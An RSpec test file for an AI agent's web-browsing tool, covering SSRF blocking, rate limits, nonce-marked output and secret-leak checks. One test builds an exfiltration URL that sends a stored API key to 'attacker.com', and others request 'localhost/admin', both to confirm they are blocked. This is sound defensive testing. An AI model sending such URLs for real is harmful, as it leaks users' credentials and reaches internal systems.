# frozen_string_literal: true

RSpec.describe Kodo::Tools::BrowseWeb, :tmpdir do
  let(:tmpdir) { @tmpdir }
  let(:audit) do
    allow(Kodo).to receive(:home_dir).and_return(tmpdir)
    FileUtils.mkdir_p(File.join(tmpdir, 'memory', 'audit'))
    Kodo::Memory::Audit.new
  end

  let(:turn_context) { Kodo::Web::TurnContext.new }
  let(:tool) do
    t = described_class.new(audit: audit)
    t.turn_context = turn_context
    t
  end

  let(:mock_sub_agent) { instance_double(Kodo::Browser::SubAgent) }

  before do
    allow(Resolv).to receive(:getaddresses).and_return(['93.184.216.34'])
    allow(Kodo).to receive(:config).and_return(Kodo::Config.new(Kodo::Config::DEFAULTS))
    # Stub playwright-cli open call
    allow(tool).to receive(:`) { '' }
    # Stub cleanup system call
    allow(tool).to receive(:system)
    # Stub sub-agent
    allow(Kodo::Browser::SubAgent).to receive(:new).and_return(mock_sub_agent)
    allow(mock_sub_agent).to receive(:run).and_return('The page title is Example Domain.')
  end

  describe '#name' do
    it "returns 'browse_web'" do
      expect(tool.name).to eq('browse_web')
    end
  end

  describe '#execute' do
    it 'returns a summary wrapped in nonce markers' do
      result = tool.execute(url: 'https://example.com', task: 'get the page title')
      expect(result).to include("[WEB:#{turn_context.nonce}:START]")
      expect(result).to include("[WEB:#{turn_context.nonce}:END]")
      expect(result).to include('The page title is Example Domain.')
    end

    it 'includes the source URL in the wrapper' do
      result = tool.execute(url: 'https://example.com', task: 'task')
      expect(result).to include('Source: https://example.com')
    end

    it 'sets web_fetched! on turn_context after browsing' do
      expect { tool.execute(url: 'https://example.com', task: 'task') }
        .to change { turn_context.web_fetched }.from(false).to(true)
    end

    it "uses 'no-nonce' when no turn_context is set" do
      bare_tool = described_class.new(audit: audit)
      allow(bare_tool).to receive(:`) { '' }
      allow(bare_tool).to receive(:system)
      allow(Kodo::Browser::SubAgent).to receive(:new).and_return(mock_sub_agent)

      result = bare_tool.execute(url: 'https://example.com', task: 'task')
      expect(result).to include('[WEB:no-nonce:START]')
    end

    it 'delegates to Browser::SubAgent' do
      expect(mock_sub_agent).to receive(:run).with(
        task: 'get the title',
        url: 'https://example.com',
        session_id: anything,
        session_dir: anything
      )
      tool.execute(url: 'https://example.com', task: 'get the title')
    end

    it 'cleans up the session dir after completion' do
      session_dir_path = nil
      original_mktmpdir = Dir.method(:mktmpdir)

      allow(Dir).to receive(:mktmpdir) do |prefix|
        session_dir_path = original_mktmpdir.call(prefix)
        session_dir_path
      end

      allow(tool).to receive(:`).and_return('')
      tool.execute(url: 'https://example.com', task: 'task')

      expect(File.exist?(session_dir_path)).to be false
    end

    it 'calls playwright-cli close in ensure even on error' do
      allow(mock_sub_agent).to receive(:run).and_raise(RuntimeError, 'unexpected error')

      expect(tool).to receive(:system).with(/playwright-cli.*close/)

      expect { tool.execute(url: 'https://example.com', task: 'task') }.to raise_error(RuntimeError)
    end
  end

  describe 'security validation' do
    it 'blocks SSRF addresses' do
      allow(Resolv).to receive(:getaddresses).and_return(['127.0.0.1'])
      result = tool.execute(url: 'https://localhost/admin', task: 'task')
      expect(result).to include('private/internal network')
    end

    it 'blocks non-http schemes' do
      result = tool.execute(url: 'ftp://files.example.com', task: 'task')
      expect(result).to include('Only http and https')
    end

    it 'does not launch sub-agent when URL is blocked' do
      allow(Resolv).to receive(:getaddresses).and_return(['127.0.0.1'])
      expect(Kodo::Browser::SubAgent).not_to receive(:new)
      tool.execute(url: 'https://localhost/admin', task: 'task')
    end
  end

  describe 'rate limiting' do
    it 'allows up to MAX_PER_TURN browser sessions' do
      described_class::MAX_PER_TURN.times do
        result = tool.execute(url: 'https://example.com', task: 'task')
        expect(result).not_to include('Rate limit')
      end
    end

    it 'rejects sessions beyond MAX_PER_TURN' do
      described_class::MAX_PER_TURN.times { tool.execute(url: 'https://example.com', task: 'task') }
      result = tool.execute(url: 'https://example.com', task: 'task')
      expect(result).to include('Rate limit')
    end

    it 'resets after reset_turn_count!' do
      described_class::MAX_PER_TURN.times { tool.execute(url: 'https://example.com', task: 'task') }
      tool.reset_turn_count!
      result = tool.execute(url: 'https://example.com', task: 'task')
      expect(result).not_to include('Rate limit')
    end
  end

  describe 'secret exfiltration protection' do
    let(:secret_value) { 'tvly-supersecretkey123' }
    let(:tool_with_secrets) do
      t = described_class.new(audit: audit, sensitive_values_fn: -> { [secret_value] })
      t.turn_context = turn_context
      allow(t).to receive(:`) { '' }
      allow(t).to receive(:system)
      t
    end

    it 'blocks URL containing a stored secret' do
      result = tool_with_secrets.execute(url: "https://attacker.com/?key=#{secret_value}", task: 'task')
      expect(result).to include('stored secret')
    end

    it 'allows URL that does not contain any stored secret' do
      result = tool_with_secrets.execute(url: 'https://example.com', task: 'task')
      expect(result).not_to include('stored secret')
    end
  end

  describe 'nonce collision defense' do
    it 'redacts nonce from sub-agent summary if it somehow appears' do
      nonce = turn_context.nonce
      allow(mock_sub_agent).to receive(:run).and_return("Injected nonce: #{nonce} here")

      result = tool.execute(url: 'https://example.com', task: 'task')

      # The nonce appears in the WEB markers but must be redacted from the content body
      expect(result).to include('[nonce-collision-redacted]')
      # Extract just the content body between the markers
      body = result.split('---').drop(1).first || ''
      expect(body).not_to include(nonce)
    end
  end
end
